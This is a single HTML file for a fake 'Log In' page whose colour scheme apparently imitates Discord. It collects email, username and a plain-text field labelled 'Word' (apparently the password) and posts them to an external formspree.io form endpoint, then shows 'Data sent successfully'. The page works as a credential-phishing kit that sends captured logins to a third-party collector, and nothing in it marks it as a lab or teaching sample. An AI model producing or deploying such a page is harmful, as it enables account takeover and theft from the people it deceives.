<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Login</title>
<style>
body{
  background:#5865F2;
  font-family:Arial, sans-serif;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}
.box{
  background:#2c2f33;
  padding:25px;
  border-radius:8px;
  width:320px;
  color:#fff;
}
.box h2{
  text-align:center;
  margin-bottom:15px;
}
label{
  font-size:12px;
  color:#b9bbbe;
}
input{
  width:100%;
  padding:8px;
  margin:6px 0 12px;
  border:none;
  border-radius:4px;
}
button{
  width:100%;
  padding:10px;
  background:#5865F2;
  border:none;
  color:white;
  font-size:16px;
  border-radius:4px;
  cursor:pointer;
}
.success{
  text-align:center;
  color:#43b581;
  display:none;
}
</style>
</head>

<body>
<div class="box">
  <h2>Log In</h2>

  <form action="https://formspree.io/f/mqekqdqq" method="POST"
        onsubmit="document.getElementById('ok').style.display='block'">

    <label>Email</label>
    <input type="email" name="email" required>

    <label>Username</label>
    <input type="text" name="username" required>

    <label>Word</label>
    <input type="text" name="word" required>

    <button type="submit">Log In</button>
  </form>

  <p id="ok" class="success">Data sent successfully âœ…</p>
</div>
</body>
</html>
